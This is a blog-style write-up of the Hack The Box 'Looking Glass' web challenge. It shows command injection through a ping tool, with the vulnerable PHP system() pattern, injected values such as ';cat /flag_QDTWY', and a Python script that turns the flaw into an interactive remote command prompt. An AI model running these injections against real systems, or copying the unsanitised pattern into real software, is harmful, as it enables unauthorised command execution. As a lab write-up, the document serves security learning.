---
title: "HTB: Looking Glass"
last_modified_at: 2021-11-07T20:00:00+01:00
categories:
  - HTB
tags:
  - Easy-Challenge
  - Web
  - OWASP Top 10
  - RCE
---

# Quick summary

A simple start to the `OWASP Top 10 Task` on HTB.<br>
This challenge focuses on `RCE` (Remote Code Execution)

## Description

> We've built the most secure networking tool in the market, come and check it out!

# Enumeration
Visiting the website at `178.62.18.46:30815`:
![Visiting the website](/assets/htb/looking_glass/visiting_website.png)

Trying to catch the ping with `sudo tcpdump -i tun0 icmp` and running a ping against attacker box gets 100% packet loss.
![Testing ping](/assets/htb/looking_glass/ping_test.png)

It appears that whatever the IP is, there's always 100% packet loss.

## Analysis

Thinking of how this could be implemented on the server side, a common trap developers can fall into is doing something like:

```php
system("ping -c 4 " + $IP);
```

If it's possible to insert a `;` into the `$IP` variable, the attacker can run a seperate command after the `ping`.

```php
system("ping -c 4 172.62.18.46; ls)
```

Here, `ls` would be run as a seperate commands.<br>
Let's see if it works!

# Exploit

Let's try `; ls` at the end of the IP address.

![RCE in Ping](/assets/htb/looking_glass/rce_in_ping.png)

It's now confirmed that the site is vulnerable to `rce`.<br>
Let's try to find the flag!

Running `;ls -la /` to look at files at root level.<br>
There's a suspect file named `flag_QDTWY` and it's world-readable.<br>

![Flag location](/assets/htb/looking_glass/flag.png)

Running `;cat /flag_QDTWY` shows the content of the file.

![Showing flag](/assets/htb/looking_glass/cat_flag.png)

# Others writeups

On my journey of learning and understanding i found the blog:<br>
[ir0nstone](https://ir0nstone.gitbook.io/hackthebox/challenges/web/looking-glass){:target="_blank"}{:rel="noopener noreferrer"}

The author have a good `Automation` and `Checking the Source` sections that I want to try aswell.

## Automation
Python script (with some alterations):

```python
#!/usr/bin/python3

from requests import post

eplots = input('rce>> ')

data = { 'test': 'ping', 'ip_address': f'178.62.0.100; {eplots}', 'submit': 'Test' }
r = post('http://178.62.18.46:30815/', data=data)

res = r.text
res = res.split('packet loss\n')[-1]
res = res.split('</textarea>')[0]

print(res.strip())
```

Running the script with results:
```bash
# ./automation.py 
>> cat /flag_QDTWY
HTB{I_f1n4lly_l00k3d_thr0ugh_th3_rc3}
```

## Checking the Source
Injecting `;cat index.php` we can see whats happening:
![Checking the Source Code](/assets/htb/looking_glass/checking_the_source.png)

# Pwned confirmation
![Looking Glass Pwned](/assets/htb/looking_glass/looking_glass_pwned.png)